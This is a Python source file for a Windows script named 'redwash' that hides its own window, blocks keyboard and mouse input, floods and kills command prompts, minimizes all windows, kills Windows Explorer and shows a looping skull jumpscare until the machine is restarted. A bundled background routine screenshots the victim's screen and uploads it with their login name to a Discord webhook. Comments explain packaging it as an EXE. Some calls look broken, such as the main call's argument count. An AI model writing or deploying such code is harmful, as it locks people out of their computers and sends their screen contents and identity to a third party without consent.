from ctypes import WinDLL, Structure, c_long, windll
from os import system, path, getlogin
from threading import Thread
from time import sleep
from colorama import init, Fore
from pynput.mouse import Controller
from mouse import release as releaseMB
from keyboard import release as releaseKB
from keyboard import block_key, unblock_key, press_and_release
from win32gui import IsWindowVisible, GetParent, GetWindow, GetWindowLong, ShowWindow, EnumWindows
from win32con import WS_EX_TOOLWINDOW, WS_EX_APPWINDOW, GWL_EXSTYLE, GW_OWNER, SW_MINIMIZE
from shutil import get_terminal_size as gts
from pygame import mixer, time
import sys
from requests import post
from PIL import ImageGrab
from io import BytesIO
from json import dumps

done = False

def createDaemonThread(process):
    Thread(target=process, daemon=True).start()

class POINT(Structure):
    _fields_ = [("x", c_long), ("y", c_long)]

def get_screen_resolution():
    user32 = windll.user32
    user32.SetProcessDPIAware()  # Make application DPI aware to get true system resolution
    screen_width = user32.GetSystemMetrics(0)  # 0 for screen width
    screen_height = user32.GetSystemMetrics(1)  # 1 for screen height
    return screen_width, screen_height

def change_window(x):
    # x=0 HIDE WINDOW
    # x=3 FULLSCREEN WINDOW

    # Get a handle to the console window
    kernel32 = WinDLL('kernel32', use_last_error=True)
    user32 = WinDLL('user32', use_last_error=True)
    hWnd = kernel32.GetConsoleWindow()
    SW_SIZE = x
    # Maximize the window
    user32.ShowWindow(hWnd, SW_SIZE)

def spamCommandPrompts(x):
    # Command to start a new prompt
    startCmd = '''start cmd.exe /k "title REDWASHED"'''
    # Command to kill existing prompts
    killCmd = '''taskkill /FI "WINDOWTITLE eq REDWASHED" /IM cmd.exe /F'''
    # Start the prompts
    for i in range(x):
        system(startCmd)
    # Kill prompts
    sleep(0.4)
    system(killCmd)
    system('cls')

def killExplorer():
    # Command to kill Windows Explorer
    system('taskkill /F /IM explorer.exe >nul 2>&1')

def restart_explorer():
    # Command to restart Windows Explorer
    system('start explorer.exe')

def releaseInputs():
    for i in range(5):
        releaseMB(button='left')
        releaseMB(button='right')
        releaseKB('ctrl')
        releaseKB('esc')
        releaseKB('alt')
        releaseKB('tab')
        releaseKB('shift')
        releaseKB('delete')

def blockInput_start():
    mouse = Controller()
    # Get screen resolution
    width, height = get_screen_resolution()
    global block_input_flag
    for i in range(105):
        block_key(i)
    while block_input_flag == 1:
        mouse.position = (width/2, height-5)

def blockInput_stop():
    global block_input_flag
    for i in range(105):
        unblock_key(i)
    block_input_flag = 0

def blockInput():
    # Release User Input Buttons
    releaseInputs()
    # Block User Input
    global block_input_flag
    block_input_flag = 1
    t1 = Thread(target=blockInput_start)
    t1.daemon = True
    t1.start()

def unblockInput():
    global done
    # Release User Input Buttons
    releaseInputs()
    done = True
    blockInput_stop()

def forceReleaseInputs():
    global done
    while not done:
        press_and_release('esc')
        releaseInputs()

def is_real_window(hWnd):
    # Check if the window is a real Windows application window.
    if not IsWindowVisible(hWnd):
        return False
    if GetParent(hWnd) != 0:
        return False
    has_no_owner = GetWindow(hWnd, GW_OWNER) == 0
    l_ex_style = GetWindowLong(hWnd, GWL_EXSTYLE)
    if (((l_ex_style & WS_EX_TOOLWINDOW) == 0 and has_no_owner)
          or ((l_ex_style & WS_EX_APPWINDOW != 0) and not has_no_owner)):
        return True
    return False

def minimizeWindows():
    # Minimize all real Windows application windows.
    def callback(hWnd, _):
        if is_real_window(hWnd):
            ShowWindow(hWnd, SW_MINIMIZE)

    EnumWindows(callback, None)

def get_terminal_size():
    # Get width and height of the console
    size = gts(fallback=(80, 25))
    return size.columns, size.lines

def print_centered_line_by_line(text, width, height):
    # Calculate vertical padding
    vertical_padding = max((height - len(text)) // 2, 0)
    print("\n" * vertical_padding)
    # Print each line centered
    for line in text:
        print(Fore.RED + line.center(width))

def resource_path(relative_path, exe=False):
    if(exe):
        try:
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = path.abspath(".")
        return path.join(base_path, relative_path)
    else:
        return path.join(path.dirname(__file__), relative_path)

def play_sound(file_path, loop=False):
    # Initialize a mixer channel
    mixer.init()
    sound = mixer.Sound(file_path)

    # Play sound; -1 for infinite loop
    sound.play(-1 if loop else 0)

    # If not looping, wait for the sound to finish
    if not loop:
        while mixer.get_busy():
            time.Clock().tick(10)

def jumpscare():
    skull = ''' uuuuuuu
 uu$$$$$$$$$$$uu
 uu$$$$$$$$$$$$$$$$$uu
 u$$$$$$$$$$$$$$$$$$$$$u
 u$$$$$$$$$$$$$$$$$$$$$$$u
 u$$$$$$$$$$$$$$$$$$$$$$$$$u
 u$$$$$$$$$$$$$$$$$$$$$$$$$u
 u$$$$$$"   "$$$"   "$$$$$$u
 "$$$$"      u$u       $$$$"
 $$$u       u$u       u$$$
 $$$u      u$$$u      u$$$
 "$$$$uu$$$   $$$uu$$$$"
 "$$$$$$$"   "$$$$$$$"
 u$$$$$$$u$$$$$$$u
 u$"$"$"$"$"$"$u
uuu        $$u$ $ $ $ $u$$       uuu
u$$$$        $$$$$u$u$u$$$       u$$$$
$$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
"""      ""$$$$$$$$$$$uu ""$"""
uuuu ""$$$$$$$$$$uuu
u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
$$$$$$$$$$""""           ""$$$$$$$$$$$"
"$$$$$"                      ""$$$$""
$$$"                         $$$$"'''.split('\n')

    # Clear window
    system('cls')

    # Print centered text
    w, h = get_terminal_size()
    print_centered_line_by_line(skull, w, h)

    # Playing Sounds
    # if compiling to EXE, change the False argument in resource_path to true.
    # e.g: resource_path('example.mp3', False) --> resource_path('example.mp3', True)

    # Play "buzz.mp3" in an infinite loop
    createDaemonThread(play_sound(resource_path('buzz.mp3', True), True))

    # Play "appear.mp3" once
    createDaemonThread(play_sound(resource_path('appear.mp3', True), False))

def redwash(hide=True, block=True, minimize=True, commands=True, kill=True, oF=sleep(0)):
    # Minimize program window
    if(hide):
        change_window(0)

    # Create a thread which spams command prompts
    if(commands):
        createDaemonThread(spamCommandPrompts(9))

    # Block User Input
    if(block):
        createDaemonThread(forceReleaseInputs)
        blockInput()

    # Minimize all user's windows
    if(minimize):
        createDaemonThread(minimizeWindows)

    # Initialize colorama
    init()
    sleep(2);

    # Kill Windows Explorer
    if(kill):
        createDaemonThread(killExplorer)

    # Run other background code
    createDaemonThread(oF)

    # Maximize Window & Jumpscare
    change_window(3)
    jumpscare()

    # Run until PC is restarted
    while(True):
        sleep(0)

def otherCode():
    # This is an example of some code you can execute in the background when redwash is running.
    # In this example, we take a screenshot of the user's computer and upload it to a discord webhook.

    # Take a screenshot of the PC
    screenshot = ImageGrab.grab()
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")

    # Your Discord webhook URL
    webhook_url = 'your_webhook_url'

    # Prepare the payload
    files = {'file': ('screenshot.png', buffered.getvalue(), 'image/png')}
    data = {'payload_json': dumps({"content": getlogin() + " just executed the script!", "username": "redwash", "avatar_url": "https://cdn.discordapp.com/attachments/1193058123733282998/1193058403862454282/terxture.png?ex=65ab5539&is=6598e039&hm=05040b88e1d2b6500f983e13bfd262ffee851d8c973d5ff4eb1e8016ea396e6a&"})}

    # POST request to the Discord webhook
    res = post(webhook_url, files=files, data=data)

if __name__ == "__main__":
    # hide=True, block=True, minimize=True, commands=True, kill=True, oF=sleep(0)
    redwash(True, True, True, True, True, False, otherCode)
